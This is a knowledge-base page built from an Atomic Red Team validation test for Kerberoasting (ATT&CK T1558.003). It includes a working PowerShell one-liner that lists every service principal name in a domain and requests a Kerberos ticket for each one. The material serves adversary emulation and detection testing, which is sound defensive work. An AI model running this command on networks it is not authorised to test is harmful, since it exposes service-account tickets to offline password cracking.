---
atomic_guid: "902f4ed2-1aba-4133-90f2-cff6d299d6da"
title: "Request All Tickets via PowerShell"
framework: "atomic"
generated: "true"
attack_technique_id: "T1558.003"
attack_technique_name: "Steal or Forge Kerberos Tickets: Kerberoasting"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.003/T1558.003.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "902f4ed2-1aba-4133-90f2-cff6d299d6da"
  - "Request All Tickets via PowerShell"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Request All Tickets via PowerShell

The following test will utilize native PowerShell Identity modules to query the domain to extract allthe Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. 
A successful execution will output the SPNs for the domain in question.

## Metadata

- Atomic GUID: 902f4ed2-1aba-4133-90f2-cff6d299d6da
- Technique: T1558.003: Steal or Forge Kerberos Tickets: Kerberoasting
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1558.003/T1558.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1558-steal_or_forge_kerberos_tickets|T1558.003]]

## Input Arguments

### domain_name

- description: The Domain Name to lookup against
- type: string
- default: %USERDNSDOMAIN%

## Dependencies

Computer must be domain joined

### Prerequisite Check

```powershell
if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
Write-Host Joining this computer to a domain must be done manually
```

## Executor

- name: powershell

### Command

```powershell
Add-Type -AssemblyName System.IdentityModel  
setspn.exe -T #{domain_name} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.003/T1558.003.yaml)
